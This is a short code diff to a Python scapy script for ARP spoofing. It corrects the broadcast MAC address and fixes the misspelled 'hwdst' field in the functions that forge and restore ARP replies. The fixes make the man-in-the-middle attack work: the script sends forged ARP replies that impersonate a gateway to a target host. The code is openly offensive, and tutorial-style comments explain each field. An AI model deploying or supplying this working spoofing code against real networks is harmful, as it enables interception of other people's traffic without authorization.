@@ -38,7 +38,7 @@ def get_mac(ip):
     arp_request = scapy.ARP(pdst = ip)
 
     #creats ethernet frame that is send to all the devices on the network
-    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff")
+    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
 
     #combines them into a single packet
     arp_request_broadcast = broadcast / arp_request 
@@ -55,13 +55,13 @@ def spoof(spoof_ip, target_ip):
     #psrc = ip that you want imporsonate (gateway)
     #pdst = where the reply is send (target)
     #hdwst = mac adress of the target you send the reply to
-    false_arp_request = scapy.ARP(pdst = target_ip, hdwst = target_mac, psrc = spoof_ip, op = 2)
+    false_arp_request = scapy.ARP(pdst = target_ip, hwdst = target_mac, psrc = spoof_ip, op = 2)
     scapy.send(false_arp_request, verbose = 0)
 
 def restore(spoof_ip, target_ip):
     spoof_mac = get_mac(spoof_ip)
     target_mac = get_mac(target_ip)
-    restore_request = scapy.ARP(pdst = target_ip, hdwst = target_mac, psrc = spoof_ip, hwsrc = spoof_mac, op = 2)
+    restore_request = scapy.ARP(pdst = target_ip, hwdst = target_mac, psrc = spoof_ip, hwsrc = spoof_mac, op = 2)
     scapy.send(restore_request, verbose = 0)
 
 def arp_spoof():
